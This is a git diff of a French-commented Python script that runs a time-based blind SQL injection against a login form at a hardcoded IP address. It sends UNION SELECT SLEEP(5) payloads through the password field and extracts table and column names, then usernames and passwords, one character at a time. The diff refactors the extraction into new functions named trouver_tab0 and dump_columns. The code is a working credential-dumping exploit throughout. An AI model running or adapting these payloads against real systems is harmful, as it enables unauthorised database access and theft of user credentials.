@@ -74,7 +74,7 @@ def db_name():
     return jsp
 
 def table_name(database):
-    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
+    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
     tables_name=[]
     a=0
     texte = ""
@@ -82,7 +82,7 @@ def table_name(database):
     url = "http://51.15.136.118/pageid.php"
     for i in range(1, 50):
         for j in range(0, len(dictionary)):
-            if a > 27:
+            if a > 25:
                 if texte != "":
                     """enlever """
                     rm_letter = texte[0]
@@ -137,6 +137,7 @@ def table_name(database):
 
 def column_name(database, nom_table):
     dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
+    global columns_name
     columns_name=[]
     a=0
     texte = ""
@@ -144,7 +145,7 @@ def column_name(database, nom_table):
     url = "http://51.15.136.118/pageid.php"
     for i in range(1, 50):
         for j in range(0, len(dictionary)):
-            if a > 27:
+            if a > 25:
                 if texte != "":
                     rm_letter = texte[0]
                     dictionary.remove(rm_letter)
@@ -179,104 +180,107 @@ def column_name(database, nom_table):
     for x in columns_name:
         b += 1
         print("Table {} : {} ".format(b, x))
-    c = int(input("Choisissez le numéro correspondant au nom de la colonne sur laquelle vous voulez continué : "))
+    return columns_name
+    """c = int(input("Choisissez le numéro correspondant au nom de la colonne sur laquelle vous voulez continué : "))
     print("Vous avez choisi {}. ".format(columns_name[c-1]))
     final_db=""
     jsp3 = final_db + "".join(columns_name[c-1])
     print(jsp3)
-    return jsp3
+    return jsp3"""
 
 
-def column_dump(database, nom_table):
+def trouver_tab0(nom_table):
+    tab = columns_name
     dictionary = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
-    columns_name=[]
-    columns2_name=[]
-    a=0
     texte = ""
-    texte2 = ""
     TIME = 5
-    c=0
-    d=0
-    tab=""
-    global r
-    r = 0
-    global s
-    s = 0
-    global t
-    t = 0
-    global u
-    u = 0
+    table = ",1,2"
+    a = 0
+    idk = []
     url = "http://51.15.136.118/pageid.php"
-    for i in range(1, 50):
+    for i in range(1, 10):
         for j in range(0, len(dictionary)):
-            if a > 31:
+            if a > 34:
                 if texte != "":
+                    print(texte)
                     rm_letter = texte[0]
                     dictionary.remove(rm_letter)
-                    print(dictionary)
-                    columns_name.append(texte)
+                    idk.append(texte)
+                    a=0
                     texte = ""
-                    a=0
-                    tab = "Element avec id " + str(s) + " a comme mdp " + columns_name[c] +"."
-                    print(tab)
-                    c+=1
-                    s = 0
                     break
-                elif texte2 != "":
-                    rm_letter = texte2[0]
-                    dictionary.remove(rm_letter)
-                    print(dictionary)
-                    columns2_name.append(texte2)
-                    texte2= ""
-                    a=0
-                    tab2 = "Element avec id " + str(u) + " a comme username " + columns2_name[d] +"."
-                    print(tab2)
-                    d+=1
-                    u = 0
-                    break
-                else:
-                    break
+            usr = "idc"
+            start_time = time.time()
+            passwd = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM " + nom_table + " WHERE " + tab[0] + " like '" + texte + dictionary[j] + "%' -- "
+            response = requests.post(url, data={'username': usr, 'password': passwd})
+            """print(passwd)"""
+            end_time = time.time()
+            total_time = end_time - start_time
+            if total_time >= TIME:
+                texte += dictionary[j]
+                print(texte)
+                a=0
+            
+            a +=1
+    print(idk)
+    return idk
 
-            for i in range(1,4):
-                usr = "idc"
-                start_time = time.time()
-                passwd = "' UNION SELECT SLEEP(5)" + table + " username FROM users WHERE id = '" + str(i) + "' and password like '" + texte + dictionary[j] + "%' -- "
-                response = requests.post(url, data={'username': usr, 'password': passwd})
-                """print(passwd)"""
-                end_time = time.time()
-                total_time = end_time - start_time
-                r += 1
-                if total_time >= TIME:
-                    texte += dictionary[j]
-                    print(texte)
-                    s = r
-                    i += 1
-                    j = 0
-                    a = 0
-                    r = 0
-                    break
-            for i in range(1,4):
-                usr = "idc"
-                start_time = time.time()
-                passwd = "' UNION SELECT SLEEP(5)" + table + " username FROM users WHERE id = '" + str(i) + "' and username like '" + texte2 + dictionary[j] + "%' -- "
-                response = requests.post(url, data={'username': usr, 'password': passwd})
-                """print(passwd)"""
-                end_time = time.time()
-                total_time = end_time - start_time
-                t += 1  
-                if total_time >= TIME:
-                    texte2 += dictionary[j]
-                    print(texte2)
-                    u = t
-                    i += 1
-                    j = 0
-                    a = 0
-                    t = 0
-                    break
-            a += 1
 
+def dump_columns(table, tab0, column_name):
+    print(table)
+    print(tab0)
+    print(column_name)
+    tab = column_name
+    nom_colonne = tab0
+    dictionary = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
+    texte = ""
+    TIME = 5
+    table = ",1,2"
+    a = 0
+    z=0
+    url = "http://51.15.136.118/pageid.php"
+    idk = []
+
+    while z <= (len(tab)):
+        z += 1
+        for x in nom_colonne:
+            x = int(x)
+            for i in range (1,30):
+                for j in range(0, len(dictionary)):
+                    if a > 36:
+                        if texte != "":
+                            idk.append(texte)
+                            a=0
+                            texte = ""
+                            print(idk)
+                            if x < len(nom_colonne):
+                                x += 1
+                            elif z < len(tab)-1:
+                                x = 1
+                                z += 1
+                            else:
+                                quit()
+                            break
+                        else:
+                            break
+
+                    usr = "idc"
+                    start_time = time.time()
+                    passwd = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM users WHERE " + tab[0] + " = " + str(x) + " and " + tab[z] + " like '" + texte + dictionary[j] + "%' -- "
+                    response = requests.post(url, data={'username': usr, 'password': passwd})
+                    print(passwd)
+                    end_time = time.time()
+                    total_time = end_time - start_time
+                    a+=1
+                    if total_time >= TIME:
+                        texte += dictionary[j]
+                        a=0
+                        j=0
+                        i+=1
+                        break
 
 nom_base_de_donnée = db_name()
 nom_table = table_name(nom_base_de_donnée)
 nom_colonne = column_name(nom_base_de_donnée, nom_table)
-column_dump(nom_base_de_donnée, nom_table)
+tab0 = trouver_tab0(nom_table)
+param = dump_columns(nom_table, tab0, nom_colonne)
